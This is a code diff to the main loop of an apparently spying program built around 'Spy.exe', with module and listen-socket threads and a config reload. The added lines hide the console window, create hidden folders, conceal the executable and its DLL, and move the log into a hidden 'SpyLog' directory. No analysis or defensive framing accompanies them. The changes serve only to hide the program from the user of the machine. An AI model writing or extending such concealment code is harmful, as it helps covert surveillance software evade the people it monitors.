@@ -9,13 +9,18 @@
 
 void main(void)
 {
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	control *B = new control, C;
 	ofstream out;
 	pthread_t ModuleStarter, ListenSocket;
 
+	CreateHiddenFolders();
+	HideFile("pthreadVSE2.dll");
+	HideFile("Spy.exe");
+
 	InitControl(C);
 
-	OutTextWithTime("Spy.txt", "Threads were started in ", &C, out);
+	OutTextWithTime("SpyLog//Spy.txt", "Threads were started in ", &C, out);
 
 	do {
 	
@@ -25,7 +30,7 @@ void main(void)
 
 		if (B == NULL)
 		{
-			OutTextWithTime("Spy.txt", "Configuration file Config.ksb is not found! Using last successfull configuration! Time: ", &C, out);
+			OutTextWithTime("SpyLog//Spy.txt", "Configuration file Config.ksb is not found! Using last successfull configuration! Time: ", &C, out);
 			B = new control;
 			do {
 
@@ -38,9 +43,9 @@ void main(void)
 		Copy(C, B);
 
 		KillModules();
-		OutTextWithTime("Spy.txt", "Threads were restarted in ", &C, out);
+		OutTextWithTime("SpyLog//Spy.txt", "Threads were restarted in ", &C, out);
 
 	} while (C.stop != true);
 
-	OutTextWithTime("Spy.txt", "Threads were stopped in ", NULL, out);
+	OutTextWithTime("SpyLog//Spy.txt", "Threads were stopped in ", NULL, out);
 }
